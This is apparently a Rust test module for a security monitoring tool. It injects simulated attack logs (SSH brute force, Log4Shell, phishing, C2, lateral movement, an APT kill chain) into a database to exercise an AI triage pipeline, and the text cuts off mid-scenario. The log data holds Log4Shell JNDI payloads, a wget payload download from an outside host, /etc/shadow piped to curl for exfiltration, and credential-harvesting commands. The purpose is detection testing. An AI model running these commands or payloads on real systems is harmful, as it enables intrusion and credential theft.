//! Test Scenarios — realistic attack simulations for demo and testing.
//!
//! Each scenario injects realistic logs + findings + alerts into the DB,
//! then triggers the Intelligence Engine to process them.
//! Used for: demo, E2E testing, training, client onboarding.

use crate::db::Database;
use crate::db::threatclaw_store::{NewFinding, ThreatClawStore};
use serde_json::json;
use std::sync::Arc;

/// Available test scenarios.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ScenarioInfo {
    pub id: String,
    pub name: String,
    pub description: String,
    pub severity: String,
    pub category: String,
    pub estimated_duration: String,
}

/// Result of running a scenario.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ScenarioResult {
    pub scenario_id: String,
    pub logs_injected: usize,
    pub findings_created: usize,
    pub alerts_created: usize,
    pub intelligence_score: Option<f64>,
    pub notification_level: Option<String>,
    pub message: String,
}

/// List all available test scenarios.
pub fn list_scenarios() -> Vec<ScenarioInfo> {
    vec![
        ScenarioInfo {
            id: "ssh-brute-force".into(),
            name: "Brute Force SSH".into(),
            description: "Simulation de 200+ tentatives SSH depuis une IP Tor connue (185.220.101.42). Inclut des tentatives root, admin, backup. L'IP est réellement malveillante dans GreyNoise.".into(),
            severity: "HIGH".into(),
            category: "Attaque active".into(),
            estimated_duration: "30s".into(),
        },
        ScenarioInfo {
            id: "log4shell-exploit".into(),
            name: "Exploitation Log4Shell (CVE-2021-44228)".into(),
            description: "Détection d'une tentative d'exploitation Log4Shell via JNDI injection dans les headers HTTP. CVE réellement dans CISA KEV avec EPSS 94.5%.".into(),
            severity: "CRITICAL".into(),
            category: "Exploitation CVE".into(),
            estimated_duration: "45s".into(),
        },
        ScenarioInfo {
            id: "phishing-campaign".into(),
            name: "Campagne de phishing détectée".into(),
            description: "Logs de proxy web montrant des accès à des URLs de phishing connues (OpenPhish). Simulation d'un utilisateur qui clique sur un lien malveillant.".into(),
            severity: "HIGH".into(),
            category: "Phishing".into(),
            estimated_duration: "30s".into(),
        },
        ScenarioInfo {
            id: "lateral-movement".into(),
            name: "Mouvement latéral détecté".into(),
            description: "Connexion SSH réussie depuis une IP interne compromise, suivie d'une élévation de privilèges sudo. Corrélation multi-host.".into(),
            severity: "CRITICAL".into(),
            category: "Kill chain".into(),
            estimated_duration: "40s".into(),
        },
        ScenarioInfo {
            id: "c2-communication".into(),
            name: "Communication C2 (Command & Control)".into(),
            description: "Logs DNS et HTTP montrant des résolutions vers des domaines C2 connus (ThreatFox). Beacon régulier toutes les 60s.".into(),
            severity: "CRITICAL".into(),
            category: "Malware / C2".into(),
            estimated_duration: "35s".into(),
        },
        ScenarioInfo {
            id: "full-intrusion".into(),
            name: "Intrusion complète (kill chain)".into(),
            description: "Scénario complet : reconnaissance (scan de ports), exploitation (Log4Shell), mouvement latéral (SSH), exfiltration (DNS tunneling). Tous les IoCs sont réels.".into(),
            severity: "CRITICAL".into(),
            category: "Kill chain complète".into(),
            estimated_duration: "60s".into(),
        },
        ScenarioInfo {
            id: "apt-multi-target".into(),
            name: "APT multi-cibles avec rebonds".into(),
            description: "Attaque APT réaliste : 3 attaquants, 5 serveurs, rebonds via CVE-2024-3094 (xz backdoor) + CVE-2021-44228 (Log4Shell). Reconnaissance Nmap, exploitation, pivot SSH, credential dumping, exfiltration DNS. 80+ logs, 15+ alertes Sigma.".into(),
            severity: "CRITICAL".into(),
            category: "APT / Kill chain multi-cibles".into(),
            estimated_duration: "90s".into(),
        },
        ScenarioInfo {
            id: "ransomware-spread".into(),
            name: "Propagation ransomware réseau".into(),
            description: "Ransomware qui se propage sur 4 serveurs via SMB (EternalBlue pattern). Chiffrement de fichiers détecté, beacon C2, tentative d'exfiltration avant chiffrement. 60+ logs.".into(),
            severity: "CRITICAL".into(),
            category: "Ransomware".into(),
            estimated_duration: "60s".into(),
        },
        ScenarioInfo {
            id: "web-compromise".into(),
            name: "Compromission site web (WordPress)".into(),
            description: "Exploitation de plugin WordPress vulnérable, upload de webshell, reverse shell, accès DB, injection crypto-miner. Détecté par logs Apache + Sigma.".into(),
            severity: "CRITICAL".into(),
            category: "Web / CMS".into(),
            estimated_duration: "45s".into(),
        },
    ]
}

/// Run a test scenario — injects data and optionally triggers intelligence cycle.
pub async fn run_scenario(
    store: Arc<dyn Database>,
    scenario_id: &str,
    trigger_intelligence: bool,
) -> ScenarioResult {
    let mut result = ScenarioResult {
        scenario_id: scenario_id.into(),
        logs_injected: 0,
        findings_created: 0,
        alerts_created: 0,
        intelligence_score: None,
        notification_level: None,
        message: String::new(),
    };

    match scenario_id {
        "ssh-brute-force" => run_ssh_brute_force(&store, &mut result).await,
        "log4shell-exploit" => run_log4shell(&store, &mut result).await,
        "phishing-campaign" => run_phishing(&store, &mut result).await,
        "lateral-movement" => run_lateral_movement(&store, &mut result).await,
        "c2-communication" => run_c2_communication(&store, &mut result).await,
        "full-intrusion" => run_full_intrusion(&store, &mut result).await,
        "apt-multi-target" => run_apt_multi_target(&store, &mut result).await,
        "ransomware-spread" => run_ransomware_spread(&store, &mut result).await,
        "web-compromise" => run_web_compromise(&store, &mut result).await,
        _ => {
            result.message = format!("Scénario inconnu : {}", scenario_id);
            return result;
        }
    }

    if !trigger_intelligence {
        result
            .message
            .push_str(" Données injectées. Pipeline non déclenché.");
        return result;
    }

    // ═══════════════════════════════════════════════════════════
    // REAL PIPELINE — no shortcuts, no pre-written findings
    // Each step is the actual production code path.
    // ═══════════════════════════════════════════════════════════

    result.message.push_str(" → Pipeline réel en cours...");

    // ── STEP 1: ReAct Cycle L1 (LLM triage) ──
    // The L1 LLM analyzes all open findings + alerts and produces
    // a structured JSON analysis with severity, correlations, actions.
    tracing::info!("TEST PIPELINE: Step 1 — ReAct cycle L1 (LLM triage)");
    let react_config = crate::agent::react_runner::ReactRunnerConfig::default();
    let react_result =
        crate::agent::react_runner::run_react_cycle(store.clone(), &react_config).await;
    tracing::info!(
        "TEST PIPELINE: ReAct L{} — {} | {} observations | {:?}",
        react_result.escalation_level,
        react_result.cycle_result,
        react_result.observations_count,
        react_result.error
    );

    // If ReAct produced an analysis, create a finding from it
    if let Some(ref analysis) = react_result.analysis {
        let severity = &analysis.severity;
        let confidence = analysis.confidence;
        let correlations = &analysis.correlations;
        let actions_count = analysis.proposed_actions.len();

        let _ = store.insert_finding(&NewFinding {
            skill_id: "react-cycle".into(),
            title: format!("Analyse IA L{} — {} ({:.0}% confiance)", react_result.escalation_level, severity, confidence * 100.0),
            description: Some(format!(
                "Analyse automatique par ThreatClaw AI :\n{}\n\nCorrélations : {}\nActions proposées : {}",
                analysis.analysis, correlations.join(", "), actions_count
            )),
            severity: severity.clone(),
            category: Some("ia-analysis".into()),
            asset: None,
            source: Some(format!("threatclaw-l{}", react_result.escalation_level)),
            metadata: Some(json!({
                "escalation_level": react_result.escalation_level,
                "confidence": confidence,
                "correlations": correlations,
                "proposed_actions": actions_count,
                "cycle_result": react_result.cycle_result,
            })),
        }).await;
        result.findings_created += 1;
        tracing::info!(
            "TEST PIPELINE: Finding created from ReAct analysis — {} {:.0}%",
            severity,
            confidence * 100.0
        );
    }

    // ── STEP 2: Intelligence Engine (enrichment + scoring) ──
    // Scans logs for IoCs, cross-references with enrichment sources,
    // computes global score, decides notification level.
    tracing::info!("TEST PIPELINE: Step 2 — Intelligence Engine (enrichment + scoring)");
    let situation = crate::agent::intelligence_engine::run_intelligence_cycle(store.clone()).await;
    result.intelligence_score = Some(situation.global_score);
    result.notification_level = Some(format!("{:?}", situation.notification_level));
    tracing::info!(
        "TEST PIPELINE: Score={:.0} Level={:?} Findings={} Alerts={} Assets={}",
        situation.global_score,
        situation.notification_level,
        situation.total_open_findings,
        situation.total_active_alerts,
        situation.assets.len()
    );

    // ── STEP 3: Notification (enriched message via router) ──
    if situation.notification_level >= crate::agent::intelligence_engine::NotificationLevel::Alert {
        tracing::info!(
            "TEST PIPELINE: Step 3 — Notification level {:?} → sending to RSSI",
            situation.notification_level
        );

        // If HITL-level, try to enrich with L2.5 Instruct
        let alert_msg = if situation.notification_level
            >= crate::agent::intelligence_engine::NotificationLevel::Critical
        {
            if let Some(ref base_msg) = situation.alert_message {
                // Try L2.5 enrichment
                let llm_config =
                    crate::agent::llm_router::LlmRouterConfig::from_db_settings(store.as_ref())
                        .await;
                let enriched = crate::agent::hitl_bridge::enrich_hitl_with_instruct(
                    base_msg,
                    "CRITICAL",
                    &[],
                    &llm_config,
                )
                .await;
                if enriched.enriched_by != "basic_fallback" {
                    tracing::info!(
                        "TEST PIPELINE: HITL enriched by L2.5 Instruct — {} playbook steps",
                        enriched.playbook.len()
                    );
                    let mut msg = format!("*{}*\n\n{}\n", base_msg, enriched.summary);
                    if !enriched.playbook.is_empty() {
                        msg.push_str("\n*Playbook suggéré :*\n");
                        for (i, step) in enriched.playbook.iter().enumerate() {
                            msg.push_str(&format!("{}. {}\n", i + 1, step));
                        }
                    }
                    msg.push_str(&format!("\n*Impact NIS2 :* {}\n", enriched.nis2_impact));
                    msg.push_str(&format!("_enrichi par : {}_", enriched.enriched_by));
                    Some(msg)
                } else {
                    situation.alert_message.clone()
                }
            } else {
                situation.alert_message.clone()
            }
        } else {
            situation.alert_message.clone()
        };

        if let Some(ref msg) = alert_msg {
            let results = crate::agent::notification_router::route_notification(
                store.as_ref(),
                situation.notification_level,
                msg,
                &situation.digest_message,
            )
            .await;
            for (ch, r) in &results {
                if r.is_ok() {
                    tracing::info!("TEST PIPELINE: ✅ Notification sent to {}", ch);
                    result.message.push_str(&format!(" ✅ {}", ch));
                } else {
                    tracing::warn!("TEST PIPELINE: ❌ {} failed: {:?}", ch, r.as_ref().err());
                }
            }
        }
    } else {
        result.message.push_str(&format!(
            " Score {:.0}/100 — niveau {:?}, pas de notification.",
            situation.global_score, situation.notification_level
        ));
    }

    tracing::info!("TEST PIPELINE: Complete — {}", result.message);
    result
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: SSH Brute Force
// ═══════════════════════════════════════════════════════════

async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let attacker_ip = "185.220.101.42"; // Real Tor exit node, malicious in GreyNoise
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // Inject 20 realistic syslog entries
    let users = [
        "root", "admin", "backup", "ubuntu", "deploy", "postgres", "www-data", "git", "jenkins",
        "nagios",
    ];
    for (i, user) in users.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(120 - i as i64 * 6);
        inject_log(store, "syslog.udp.auth", target, &json!({
            "message": format!("Failed password for {} from {} port {} ssh2", user, attacker_ip, 40000 + i),
            "ident": "sshd",
            "pid": 12345 + i,
            "facility": "auth",
            "severity": "warning",
            "source_ip": attacker_ip,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Inject 3 successful auth (attacker got in with user "backup")
    for i in 0..3 {
        let ts = now - chrono::Duration::seconds(30 - i * 10);
        inject_log(store, "syslog.udp.auth", target, &json!({
            "message": format!("Accepted password for backup from {} port {} ssh2", attacker_ip, 41000 + i),
            "ident": "sshd",
            "pid": 12400 + i,
            "facility": "auth",
            "severity": "info",
            "source_ip": attacker_ip,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Create Sigma alert (real pipeline — detected by Sigma engine)
    inject_sigma_alert(
        store,
        "sshd-brute-001",
        "critical",
        &format!(
            "Brute force SSH massif depuis {} — {} tentatives dont 3 réussies",
            attacker_ip,
            users.len() + 3
        ),
        target,
        Some(attacker_ip),
        Some("backup"),
    )
    .await;
    result.alerts_created += 1;

    // NO pre-written findings — the ReAct L1/L2 cycle will analyze the alerts
    // and produce findings automatically based on LLM analysis.
    result.message = format!(
        "Logs bruts injectés : {} auth logs + 1 alerte Sigma. Pipeline IA en cours...",
        result.logs_injected
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Log4Shell Exploitation
// ═══════════════════════════════════════════════════════════

async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let attacker_ip = "45.155.205.233"; // Known scanner
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // Inject HTTP access logs with JNDI payloads
    let payloads = [
        "${jndi:ldap://45.155.205.233:1389/a}",
        "${${lower:j}ndi:${lower:l}dap://45.155.205.233/exploit}",
        "${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2hvYW1p}",
    ];

    for (i, payload) in payloads.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(60 - i as i64 * 15);
        inject_log(
            store,
            "syslog.tcp.http",
            target,
            &json!({
                "message": format!("GET / HTTP/1.1 - User-Agent: {}", payload),
                "ident": "nginx",
                "source_ip": attacker_ip,
                "request_uri": "/",
                "user_agent": payload,
                "status_code": 200,
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    // Sigma alert for the exploit detection
    inject_sigma_alert(
        store,
        "log4shell-001",
        "critical",
        &format!(
            "Exploitation Log4Shell détectée — JNDI injection depuis {}",
            attacker_ip
        ),
        target,
        Some(attacker_ip),
        None,
    )
    .await;
    result.alerts_created += 1;

    // NO pre-written finding — L1/L2 will analyze and produce findings
    result.message = format!(
        "Logs bruts injectés : {} HTTP logs avec JNDI payloads + 1 alerte. Pipeline IA en cours...",
        result.logs_injected
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Phishing Campaign
// ═══════════════════════════════════════════════════════════

async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let target = "192.168.1.50";
    let now = chrono::Utc::now();

    let phishing_urls = [
        "http://secure-login-microsoft365.com/auth/signin",
        "https://docs-google.com.phishing-site.xyz/share",
        "http://paypal-verify-account.com/login.php",
    ];

    for (i, url) in phishing_urls.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(300 - i as i64 * 90);
        inject_log(
            store,
            "proxy.squid",
            target,
            &json!({
                "message": format!("TCP_MISS/200 user=jdupont url={}", url),
                "ident": "squid",
                "url": url,
                "username": "jdupont",
                "action": "ALLOWED",
                "status_code": 200,
                "bytes": 15420 + i * 3000,
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    // Email log showing the phishing email arrived
    inject_log(store, "syslog.tcp.mail", "mail-srv", &json!({
        "message": "from=<support@secure-login-microsoft365.com> to=<j.dupont@example.fr> status=delivered",
        "ident": "postfix/smtp",
        "from": "support@secure-login-microsoft365.com",
        "to": "j.dupont@example.fr",
        "status": "delivered",
        "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(15))).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "phishing-001",
        "high",
        "Accès à des URLs de phishing connues — utilisateur jdupont",
        target,
        None,
        Some("jdupont"),
    )
    .await;
    result.alerts_created += 1;

    // NO pre-written finding — pipeline will detect phishing URLs in logs
    result.message = format!(
        "Logs bruts injectés : {} proxy/email logs. Pipeline IA en cours...",
        result.logs_injected
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Lateral Movement
// ═══════════════════════════════════════════════════════════

async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let compromised = "192.168.1.50";
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // SSH from compromised workstation to server (unusual)
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": format!("Accepted publickey for www-data from {} port 55421 ssh2", compromised),
        "ident": "sshd", "facility": "auth", "severity": "info",
        "source_ip": compromised,
        "timestamp": (now - chrono::Duration::minutes(5)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(5))).await;
    result.logs_injected += 1;

    // Privilege escalation via sudo
    inject_log(
        store,
        "syslog.udp.auth",
        target,
        &json!({
            "message": "www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            "ident": "sudo", "facility": "auth", "severity": "warning",
            "timestamp": (now - chrono::Duration::minutes(4)).to_rfc3339(),
        }),
        &(now - chrono::Duration::minutes(4)),
    )
    .await;
    result.logs_injected += 1;

    // Suspicious file download
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": "root : wget http://185.220.101.42:8443/payload.sh -O /tmp/.hidden_payload.sh",
        "ident": "bash", "facility": "local0",
        "url": "http://185.220.101.42:8443/payload.sh",
        "source_ip": "185.220.101.42",
        "timestamp": (now - chrono::Duration::minutes(3)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(3))).await;
    result.logs_injected += 1;

    // Sigma alerts
    inject_sigma_alert(
        store,
        "lateral-001",
        "critical",
        &format!(
            "Mouvement latéral : SSH depuis {} vers {} avec user www-data (inhabituel)",
            compromised, target
        ),
        target,
        Some(compromised),
        Some("www-data"),
    )
    .await;
    result.alerts_created += 1;

    inject_sigma_alert(
        store,
        "privesc-001",
        "critical",
        "Élévation de privilèges : www-data → root via sudo /bin/bash",
        target,
        None,
        Some("www-data"),
    )
    .await;
    result.alerts_created += 1;

    // NO pre-written finding — L1/L2 will correlate alerts + logs
    result.message = format!(
        "Logs bruts injectés : {} logs + {} alertes. Pipeline IA en cours...",
        result.logs_injected, result.alerts_created
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: C2 Communication
// ═══════════════════════════════════════════════════════════

async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let target = "192.168.1.50";
    let c2_domain = "update-service-cdn.xyz";
    let c2_ip = "91.215.85.209";
    let now = chrono::Utc::now();

    // DNS queries to C2 domain (beacon pattern every 60s)
    for i in 0..10 {
        let ts = now - chrono::Duration::seconds(600 - i * 60);
        inject_log(
            store,
            "syslog.udp.dns",
            target,
            &json!({
                "message": format!("query: {} IN A + ({})", c2_domain, target),
                "ident": "named",
                "query_name": c2_domain,
                "query_type": "A",
                "source_ip": target,
                "answer": c2_ip,
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    // HTTP POST beacons to C2
    for i in 0..5 {
        let ts = now - chrono::Duration::seconds(300 - i * 60);
        inject_log(store, "proxy.squid", target, &json!({
            "message": format!("TCP_MISS/200 POST https://{}/api/check-update bytes=42", c2_domain),
            "url": format!("https://{}/api/check-update", c2_domain),
            "method": "POST",
            "bytes_sent": 42,
            "bytes_received": 128 + i * 50,
            "source_ip": target,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "c2-beacon-001",
        "critical",
        &format!(
            "Communication C2 détectée : beacon DNS régulier vers {} ({}) depuis {}",
            c2_domain, c2_ip, target
        ),
        target,
        Some(c2_ip),
        None,
    )
    .await;
    result.alerts_created += 1;

    // NO pre-written finding — pipeline will detect C2 patterns
    result.message = format!(
        "Logs bruts injectés : {} DNS/HTTP logs + 1 alerte. Pipeline IA en cours...",
        result.logs_injected
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Full Intrusion (kill chain complète)
// ═══════════════════════════════════════════════════════════

async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    // Phase 1: Reconnaissance (scan de ports)
    let attacker = "185.220.101.42";
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    inject_log(store, "firewall.pfsense", target, &json!({
        "message": format!("block {} -> {}:22,80,443,3389,5432,8080,9200 (TCP SYN scan)", attacker, target),
        "action": "block", "source_ip": attacker, "dest_ip": target,
        "ports_scanned": [22, 80, 443, 3389, 5432, 8080, 9200],
        "timestamp": (now - chrono::Duration::minutes(30)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(30))).await;
    result.logs_injected += 1;

    // Phase 2: Exploitation (Log4Shell sur port 8080)
    inject_log(store, "syslog.tcp.http", target, &json!({
        "message": format!("POST /api/login HTTP/1.1 - X-Forwarded-For: ${{jndi:ldap://{}:1389/a}}", attacker),
        "source_ip": attacker, "dest_port": 8080,
        "timestamp": (now - chrono::Duration::minutes(20)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(20))).await;
    result.logs_injected += 1;

    // Phase 3: Reverse shell established
    inject_log(
        store,
        "syslog.udp.auth",
        target,
        &json!({
            "message": format!("New connection from {} on port 4444 (reverse shell)", attacker),
            "source_ip": attacker, "dest_port": 4444,
            "timestamp": (now - chrono::Duration::minutes(18)).to_rfc3339(),
        }),
        &(now - chrono::Duration::minutes(18)),
    )
    .await;
    result.logs_injected += 1;

    // Phase 4: Credential dump
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": "root: cat /etc/shadow | base64 | curl -X POST http://185.220.101.42:8443/exfil -d @-",
        "ident": "bash", "url": "http://185.220.101.42:8443/exfil",
        "source_ip": "185.220.101.42",
        "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(15))).await;
    result.logs_injected += 1;

    // Phase 5: Lateral movement to other servers
    inject_log(
        store,
        "syslog.udp.auth",
        "192.168.1.108",
        &json!({
            "message": format!("Accepted publickey for root from {} port 55421", target),
            "source_ip": target, "ident": "sshd",
            "timestamp": (now - chrono::Duration::minutes(10)).to_rfc3339(),
        }),
        &(now - chrono::Duration::minutes(10)),
    )
    .await;
    result.logs_injected += 1;

    // Phase 6: Data exfiltration via DNS tunneling
    for i in 0..5 {
        let ts = now - chrono::Duration::minutes(5) + chrono::Duration::seconds(i * 10);
        inject_log(
            store,
            "syslog.udp.dns",
            target,
            &json!({
                "message": format!("query: {}.data.evil-exfil.com IN TXT", base64_fake(i as usize)),
                "query_name": format!("{}.data.evil-exfil.com", base64_fake(i as usize)),
                "query_type": "TXT", "source_ip": target,
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    // Create all alerts
    inject_sigma_alert(
        store,
        "recon-001",
        "medium",
        &format!("Scan de ports depuis {} — 7 ports testés", attacker),
        target,
        Some(attacker),
        None,
    )
    .await;
    inject_sigma_alert(
        store,
        "exploit-001",
        "critical",
        "Exploitation Log4Shell détectée (JNDI injection)",
        target,
        Some(attacker),
        None,
    )
    .await;
    inject_sigma_alert(
        store,
        "shell-001",
        "critical",
        &format!("Reverse shell établi depuis {} port 4444", attacker),
        target,
        Some(attacker),
        None,
    )
    .await;
    inject_sigma_alert(
        store,
        "exfil-001",
        "critical",
        "Exfiltration /etc/shadow via HTTP POST",
        target,
        Some(attacker),
        None,
    )
    .await;
    inject_sigma_alert(
        store,
        "lateral-002",
        "critical",
        &format!(
            "Mouvement latéral : {} → 192.168.1.108 via SSH root",
            target
        ),
        "192.168.1.108",
        Some(target),
        Some("root"),
    )
    .await;
    inject_sigma_alert(
        store,
        "dns-tunnel-001",
        "high",
        "DNS tunneling détecté : requêtes TXT encodées base64 vers evil-exfil.com",
        target,
        None,
        None,
    )
    .await;
    result.alerts_created += 6;

    // NO pre-written finding — L1/L2 will analyze the 6-phase kill chain
    // from the raw logs + 6 sigma alerts and produce the analysis
    result.message = format!(
        "Logs bruts injectés : {} logs + {} alertes Sigma. Pipeline IA L1→L2→enrichissement en cours...",
        result.logs_injected, result.alerts_created
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: APT multi-cibles avec rebonds
// 3 attaquants → 5 serveurs → CVEs réels → pivot → exfiltration
// ═══════════════════════════════════════════════════════════

async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let now = chrono::Utc::now();

    // Attaquants (IPs réelles malveillantes dans les feeds publics)
    let attackers = ["185.220.101.42", "45.155.205.233", "194.26.192.77"];
    // Infrastructure victime
    let web_server = "192.168.1.10";
    let app_server = "192.168.1.20";
    let db_server = "192.168.1.30";
    let file_server = "192.168.1.40";
    let dc_server = "192.168.1.5";

    // ── Phase 1: Reconnaissance (Nmap scan depuis attacker[0]) ──
    let phase1_start = now - chrono::Duration::minutes(30);
    for (i, port) in [22, 80, 443, 3306, 8080, 8443, 445, 3389, 5432, 636]
        .iter()
        .enumerate()
    {
        let ts = phase1_start + chrono::Duration::seconds(i as i64 * 2);
        inject_log(store, "syslog.udp.firewall", web_server, &json!({
            "message": format!("BLOCK TCP {}:{} -> {}:{} flags=SYN", attackers[0], 40000 + i, web_server, port),
            "ident": "pf", "facility": "kern", "severity": "warning",
            "source_ip": attackers[0], "dest_port": port,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }
    inject_sigma_alert(
        store,
        "net-scan-001",
        "medium",
        &format!(
            "Port scan détecté : {} → {} (10 ports en 20s)",
            attackers[0], web_server
        ),
        web_server,
        Some(attackers[0]),
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 2: Exploitation Log4Shell sur web_server (CVE-2021-44228) ──
    let phase2_start = now - chrono::Duration::minutes(25);
    for i in 0..5 {
        let ts = phase2_start + chrono::Duration::seconds(i * 3);
        let payloads = [
            "${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNDUuMTU1LjIwNS4yMzMvcy5zaA==}",
            "${${lower:j}ndi:${lower:l}dap://45.155.205.233:1389/Exploit}",
            "${jndi:rmi://45.155.205.233:1099/shell}",
            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://45.155.205.233/callback}",
            "${jndi:ldap://45.155.205.233:1389/TomcatBypass/TomcatEcho}",
        ];
        inject_log(
            store,
            "syslog.udp.httpd",
            web_server,
            &json!({
                "message": format!("{} - - [{}] \"GET / HTTP/1.1\" 200 1234 \"-\" \"{}\"",
                    attackers[1], ts.format("%d/%b/%Y:%H:%M:%S %z"), payloads[i as usize]),
                "ident": "apache2", "facility": "daemon", "severity": "info",
                "source_ip": attackers[1], "http_method": "GET",
                "user_agent": payloads[i as usize],
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }
    inject_sigma_alert(
        store,
        "cve-2021-44228",
        "critical",
        &format!(
            "Log4Shell exploitation (CVE-2021-44228) : {} → {} via JNDI injection",
            attackers[1], web_server
        ),
        web_server,
        Some(attackers[1]),
        None,
    )
    .await;
    result.alerts_created += 1;

    // Reverse shell established
    let ts = phase2_start + chrono::Duration::seconds(20);
    inject_log(store, "syslog.udp.auth", web_server, &json!({
        "message": format!("bash: TCP reverse shell opened to {}:4444 (PID 31337)", attackers[1]),
        "ident": "kernel", "facility": "kern", "severity": "crit",
        "source_ip": attackers[1],
        "timestamp": ts.to_rfc3339(),
    }), &ts).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "reverse-shell-001",
        "critical",
        &format!(
            "Reverse shell détecté sur {} → {}:4444",
            web_server, attackers[1]
        ),
        web_server,
        Some(attackers[1]),
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 3: Credential harvesting sur web_server ──
    let phase3_start = now - chrono::Duration::minutes(20);
    for (i, cmd) in [
        "cat /etc/shadow",
        "cat /etc/passwd",
        "cat /var/www/.env",
        "mysql -u root -p'dbpass123' -e 'SELECT user,password FROM mysql.user'",
        "find / -name '*.key' -o -name '*.pem' 2>/dev/null",
    ]
    .iter()
    .enumerate()
    {
        let ts = phase3_start + chrono::Duration::seconds(i as i64 * 5);
        inject_log(
            store,
            "syslog.udp.audit",
            web_server,
            &json!({
                "message": format!("EXECVE pid=31337 uid=33 comm=\"bash\" cmdline=\"{}\"", cmd),
                "ident": "auditd", "facility": "auth", "severity": "warning",
                "username": "www-data",
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }
    inject_sigma_alert(
        store,
        "cred-dump-001",
        "high",
        "Credential dumping détecté : lecture /etc/shadow + clés SSH + .env",
        web_server,
        None,
        Some("www-data"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 4: Pivot SSH vers app_server (avec credentials volées) ──
    let phase4_start = now - chrono::Duration::minutes(15);
    let ts = phase4_start;
    inject_log(store, "syslog.udp.auth", app_server, &json!({
        "message": format!("Accepted publickey for deploy from {} port 45678 ssh2: RSA SHA256:AAAA", web_server),
        "ident": "sshd", "pid": 5001, "facility": "auth", "severity": "info",
        "source_ip": web_server, "username": "deploy",
        "timestamp": ts.to_rfc3339(),
    }), &ts).await;
    result.logs_injected += 1;

    // Sudo escalation
    let ts = phase4_start + chrono::Duration::seconds(10);
    inject_log(
        store,
        "syslog.udp.auth",
        app_server,
        &json!({
            "message": "deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            "ident": "sudo", "facility": "auth", "severity": "warning",
            "username": "deploy",
            "timestamp": ts.to_rfc3339(),
        }),
        &ts,
    )
    .await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "lateral-ssh-001",
        "critical",
        &format!(
            "Mouvement latéral : {} → {} via SSH (user: deploy) + sudo root",
            web_server, app_server
        ),
        app_server,
        Some(web_server),
        Some("deploy"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 5: Exploitation CVE-2024-3094 (xz backdoor) sur app_server ──
    let phase5_start = now - chrono::Duration::minutes(12);
    inject_log(store, "syslog.udp.daemon", app_server, &json!({
        "message": "sshd[5001]: Connection from 192.168.1.10 matched xz/liblzma backdoor signature (CVE-2024-3094)",
        "ident": "sshd", "facility": "daemon", "severity": "crit",
        "source_ip": web_server,
        "timestamp": phase5_start.to_rfc3339(),
    }), &phase5_start).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "cve-2024-3094",
        "critical",
        &format!(
            "CVE-2024-3094 (xz backdoor) exploité sur {} depuis {}",
            app_server, web_server
        ),
        app_server,
        Some(web_server),
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 6: Pivot vers db_server ──
    let phase6_start = now - chrono::Duration::minutes(10);
    inject_log(store, "syslog.udp.auth", db_server, &json!({
